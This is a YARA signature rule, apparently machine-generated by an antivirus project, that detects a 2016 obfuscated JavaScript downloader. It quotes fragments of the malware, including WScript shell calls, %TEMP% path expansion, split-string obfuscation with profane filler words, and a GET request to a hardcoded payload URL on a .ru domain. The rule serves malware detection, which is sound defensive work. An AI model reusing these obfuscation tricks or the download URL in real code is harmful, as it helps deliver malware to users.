rule sig_20160428_d6883e1f2a0c9a555341c19c55a8805d {
  meta:
    description = "datamaliciousorder - file 20160428_d6883e1f2a0c9a555341c19c55a8805d.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "acb931b99bb6bdba5a91ab012ae46cd4612d7aa78d6f261dfddac9cd93b75323"

  strings:
    $s1  = "function RdiQsaEpiZseSgmBiiNkj(XidNbrPdxTpgGavHfcEsn){NoeSymFkwOhnGuhOwsKmq[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s2  = "var NoeSymFkwOhnGuhOwsKmq = function BdtJezSpvRsbEcvYjaBvf() {return WnkIdsKunDcoMnsVisMsy[UrzYwoZjyGumBrvEihVob](\"WScript\"+\"" ascii
    $s3  = "function RdiQsaEpiZseSgmBiiNkj(XidNbrPdxTpgGavHfcEsn){NoeSymFkwOhnGuhOwsKmq[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s4  = "var WnkIdsKunDcoMnsVisMsy = this[\"WScript\"];" fullword ascii
    $s5  = "function QonNsrGhqKxeYrkCzlYdh() {return NoeSymFkwOhnGuhOwsKmq[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s6  = "function FxuXsiLrzFsvZtpGyaPqv(IxnTcaSelVrjUytZpbLlg, UjsNzpGujLcgEdrHqmTvd){OqgEtgKaeNuhSzfIkoBfq = OqgEtgKaeNuhSzfIkoBfq * 1; " ascii
    $s7  = "var NoeSymFkwOhnGuhOwsKmq = function BdtJezSpvRsbEcvYjaBvf() {return WnkIdsKunDcoMnsVisMsy[UrzYwoZjyGumBrvEihVob](\"WScript\"+\"" ascii
    $s8  = "function UynNzsKjnGfxLtaZhoNbh() {return ((QofExmQiqKvrEbdEbqEaf == true) && (QofExmQiqKvrEbdEbqEaf == IuyHziUvsJmcUslEpgXor)) ?" ascii
    $s9  = "EtqJjwEqzBhmEmzIsnLae[YieJcxUwaXlkJptFhyTdb](\"G\" + \"ET\", \"http://berezy74.ru/n8sjad\", false);" fullword ascii
    $s10 = "function FxuXsiLrzFsvZtpGyaPqv(IxnTcaSelVrjUytZpbLlg, UjsNzpGujLcgEdrHqmTvd){OqgEtgKaeNuhSzfIkoBfq = OqgEtgKaeNuhSzfIkoBfq * 1; " ascii
    $s11 = "function QonNsrGhqKxeYrkCzlYdh() {return NoeSymFkwOhnGuhOwsKmq[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s12 = "function SbdXlfQgvUquJvyQqsZrk(){return OqtLzkKgyLkkKheYzpXzc + \"\";};" fullword ascii
    $s13 = "if (EtqJjwEqzBhmEmzIsnLae[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s14 = "return IxnTcaSelVrjUytZpbLlg - UjsNzpGujLcgEdrHqmTvd;};" fullword ascii
    $s15 = "function UynNzsKjnGfxLtaZhoNbh() {return ((QofExmQiqKvrEbdEbqEaf == true) && (QofExmQiqKvrEbdEbqEaf == IuyHziUvsJmcUslEpgXor)) ?" ascii
    $s16 = "return FxuXsiLrzFsvZtpGyaPqv(1 == 1 ? CyxUjsSmlIkuQnySucTbb : 0, 1 == 1 ? ZyiYaaDotGncVkjGoaLvr : 0);" fullword ascii
    $s17 = "var ZebGwxCphJgdJvzOasFio = false;" fullword ascii
    $s18 = "function KpmWrnGheTglNwkLkpOrm()" fullword ascii
    $s19 = "}while (FlkVxeTqfAwkKqfTlxGhz);" fullword ascii
    $s20 = "function GyqPhkMuxZqbYmdRzwSdv(GzhWwaYpiQueAmyPsnNzm) {var PexRwiQesKxdBkgDvmSbj = (1, 2, 3, 4, 5, GzhWwaYpiQueAmyPsnNzm); retur" ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}